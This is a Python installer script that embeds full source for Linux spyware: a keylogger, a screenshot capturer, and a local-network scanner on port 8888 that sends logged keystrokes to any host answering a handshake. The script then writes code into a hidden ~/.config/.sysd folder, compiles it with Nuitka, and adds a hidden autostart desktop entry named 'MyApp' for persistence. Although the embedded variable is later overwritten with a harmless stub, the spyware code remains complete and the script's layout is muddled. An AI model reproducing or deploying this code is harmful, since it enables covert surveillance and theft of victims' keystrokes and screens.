import os
import time
import subprocess


# Define your malware script as a Python string
malware_code = '''#!/usr/bin/env python3
import pickle
import socket
import os
from pynput import keyboard
import mss
import time
import threading
import ipaddress
import shutil
from datetime import datetime

# Log each launch to confirm execution
with open(os.path.expanduser("~/.config/.sysd/launch.log"), "a") as log:
    log.write(f"Launched at {time.ctime()}\n")

def get_local_network():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return ipaddress.IPv4Network(f"{local_ip}/24", strict=False), local_ip

def check_ip(ip, port, results, local_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.3)
    if sock.connect_ex((str(ip), port)) == 0:
        try:
            sock.sendall(b"I<3CatsCauseTheyAreReallyCute")
            sock.settimeout(1)
            response = sock.recv(1024).decode('utf-8')
            results.append((str(ip), response))
        except Exception as e:
            results.append((str(ip), "Handshake failed"))

def fast_scan(network, local_ip, port=8888):
    results = []
    threads = []
    ips_to_scan = list(network.hosts()) + [ipaddress.IPv4Address('127.0.0.1'), ipaddress.IPv4Address(local_ip)]
    for ip in ips_to_scan:
        thread = threading.Thread(target=check_ip, args=(ip, port, results, local_ip))
        threads.append(thread)
        thread.start()
        if len(threads) >= 50:
            for t in threads:
                t.join()
            threads = []
    for t in threads:
        t.join()
    return results

def quick_test():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex(('127.0.0.1', 8888))
        if result == 0:
            try:
                sock.sendall(b"I<3CatsCauseTheyAreReallyCute")
                response = sock.recv(1024).decode('utf-8')
                sock.close()
                return True
            except Exception as e:
                sock.close()
                return False
        else:
            sock.close()
            return False
    except Exception as e:
        return False

def run_network_scan():
    if not quick_test():
        return []
    network, local_ip = get_local_network()
    devices = fast_scan(network, local_ip)
    return devices

Clock = time.time()
folder = os.path.join(os.path.expanduser("~"), "my_app_data")
os.makedirs(folder, exist_ok=True)
data = ""

found_ip = None
found_port = 8888

def on_press(key):
    global data
    if key == keyboard.Key.backspace:
        data = data[:-1]
    else:
        if hasattr(key, 'char') and key.char:
            if key.char != '<' and key.char != '>':
                data += key.char

def take_screenshots_interval(interval=3, save_dir=folder):
    os.makedirs(save_dir, exist_ok=True)
    count = 1
    with mss.mss() as sct:
        while True:
            filename = os.path.join(save_dir, f'screenshot_{count}.png')
            sct.shot(output=filename)
            count += 1
            time.sleep(interval)

def file_server_loop():
    global found_ip
    while True:
        time.sleep(10)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        existing_files = [f for f in os.listdir(folder) if f.startswith(f"data_{timestamp}")]
        suffix = len(existing_files) + 1
        pkl_file = os.path.join(folder, f"data_{timestamp}_{suffix}.pkl")
        txt_file = os.path.join(folder, f"data_{timestamp}_{suffix}.txt")
        with open(pkl_file, "wb") as f:
            pickle.dump(data, f)
        with open(txt_file, "w") as f:
            f.write(data)
        confirm_dir = os.path.join(os.path.expanduser("~"), "H4K3R_CONFIRM")
        os.makedirs(confirm_dir, exist_ok=True)
        shutil.copy2(pkl_file, os.path.join(confirm_dir, f"copy_{timestamp}_{suffix}.pkl"))
        shutil.copy2(txt_file, os.path.join(confirm_dir, f"copy_{timestamp}_{suffix}.txt"))
        screenshots = [f for f in os.listdir(folder) if f.startswith("screenshot_") and f.endswith(".png")]
        for file in screenshots:
            shutil.copy2(os.path.join(folder, file), os.path.join(confirm_dir, file))

        if found_ip:
            try:
                with socket.create_connection((found_ip, found_port), timeout=10) as client:
                    client.sendall(b"I<3CatsCauseTheyAreReallyCute")
                    with open(txt_file, "rb") as f:
                        client.sendall(f.read())
            except Exception as e:
                pass

def main():
    global found_ip
    devices = run_network_scan()
    if devices:
        found_ip = devices[0][0]  # use first successful IP
    screenshot_thread = threading.Thread(target=take_screenshots_interval, daemon=True)
    screenshot_thread.start()
    file_thread = threading.Thread(target=file_server_loop, daemon=True)
    file_thread.start()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()
'''

# 1. Define app source code (this is the program to run on startup)
malware_code = """#!/usr/bin/env python3
import time

def main():
    while True:
        print("Hello from MyApp!")
        time.sleep(60)

if __name__ == "__main__":
    main()
"""

# 2. Write it to disk

# Define paths
home = os.path.expanduser("~")
hidden_dir = os.path.join(home, ".config", ".sysd")
malware_path = os.path.join(hidden_dir, "daemon.py")
#~/.config/.sysd/
autostart_path = os.path.join(home, ".config", "autostart")
desktop_file = os.path.join(autostart_path, "systemd-daemon.desktop")
#~/.config/autostart/
os.makedirs(hidden_dir, exist_ok=True)

home = os.path.expanduser("~")
hidden_dir = os.path.join(home, ".config", ".sysd")
malware_path = os.path.join(hidden_dir, "daemon.py")
#~/.config/.sysd/
app_py = os.path.join(hidden_dir, "app.py")

with open(app_py, "w") as f:
    f.write(malware_code)

print(f"[+] App written to: {app_py}")

# 3. Compile to ELF using Nuitka

# Nuitka compile command
cmd = [
    "nuitka",
    "--standalone",
    "--onefile",
    app_py
]

# Run the command
try:
    subprocess.run(cmd, check=True)
    print("[+] Nuitka compilation successful.")
except subprocess.CalledProcessError as e:
    print("[-] Compilation failed:", e)

# 4. Find compiled binary
binary_name = os.path.splitext(os.path.basename(app_py))[0] + ".bin"
binary_path = os.path.join(hidden_dir, binary_name)

# 5. Create .desktop autostart entry
autostart_dir = os.path.join(home, ".config", "autostart")
os.makedirs(autostart_dir, exist_ok=True)

desktop_file = os.path.join(autostart_dir, "MyApp.desktop")
with open(desktop_file, "w") as f:
    f.write(f"""[Desktop Entry]
Type=Application
Exec={binary_path}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name=MyApp
Comment=Auto-start MyApp at login
""")

print(f"[+] Autostart file created at: {desktop_file}")
print(f"[✓] MyApp will now run on startup.")
